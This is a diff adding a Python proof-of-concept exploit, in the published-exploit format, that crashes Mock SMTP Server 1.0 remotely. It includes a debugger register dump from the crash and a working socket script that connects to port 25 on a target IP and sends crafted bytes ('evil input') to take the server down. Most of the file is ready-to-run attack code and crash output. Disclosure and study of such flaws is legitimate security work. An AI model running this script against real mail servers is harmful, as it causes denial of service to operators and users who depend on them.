@@ -1,0 +1,92 @@
+#!/usr/bin/python
+# Exploit Title: Mock SMTP Server 1.0 Remote Crash PoC
+# Date: 23-08-2015
+# Exploit Author: Shankar Damodaran
+# Author's Twitter : @sh4nx0r
+# Vendor Homepage: http://mocksmtpserver.codeplex.com
+# Software Link: http://mocksmtpserver.codeplex.com/downloads/get/87077
+# Version: 1.0
+# Tested on: Microsoft Windows 7 Home Premium Service Pack 1
+# Tested on: Microsoft Windows XP Professional SP3
+# Image PoC : http://i.imgur.com/lp7NHTm.png
+
+
+# The Stack Trace from Microsoft Windows XP Professional SP3
+'''
+The Exception occured on EBX Register (E0434F4D)
+
+The Registers during the crash
+
+EAX 03BAF618
+ECX 00000000
+EDX 00000028
+EBX E0434F4D
+ESP 03BAF614
+EBP 03BAF668
+ESI 03BAF6A4
+EDI 001DFF28
+EIP 7C812FD3 KERNEL32.7C812FD3
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 0  CS 001B 32bit 0(FFFFFFFF)
+A 0  SS 0023 32bit 0(FFFFFFFF)
+Z 0  DS 0023 32bit 0(FFFFFFFF)
+S 0  FS 003B 32bit 7FFD6000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr WSAECONNRESET (00002746)
+EFL 00000202 (NO,NB,NE,A,NS,PO,GE,G)
+ST0 empty
+ST1 empty
+ST2 empty
+ST3 empty
+ST4 empty
+ST5 empty
+ST6 empty
+ST7 empty
+               3 2 1 0      E S P U O Z D I
+FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+Courtesy : Immunity Debugger
+
+'''
+
+
+
+import socket
+
+# Preparing a junk array with two NOPS.
+junk_bed=["\x90","\x90"]
+
+# The ip address of the remote host
+smtphost = '192.168.1.7'
+
+# The port of the remote host
+smtpport = 25
+
+for junk in junk_bed:
+	
+	# Initialize the socket stream
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	
+	# Setting a 5 second tolerance limit to check the server uptime
+	s.settimeout(5)
+	
+	# Connecting to the remote service.
+	s.connect((smtphost,smtpport))
+
+	# If the server doesn't respond, means its crashed.
+    	try:
+		s.recv(1)
+	except socket.timeout:
+		print "The SMTP Server has been crashed."
+		quit()
+	
+	# Sending the evil input
+	print "Evil Input Sent...Triggering a crash."
+	s.send('\r\n'+junk+'\r\n')
+
+	# Close the connection socket
+	s.close()
+
+# End of PoC - Shankar Damodaran
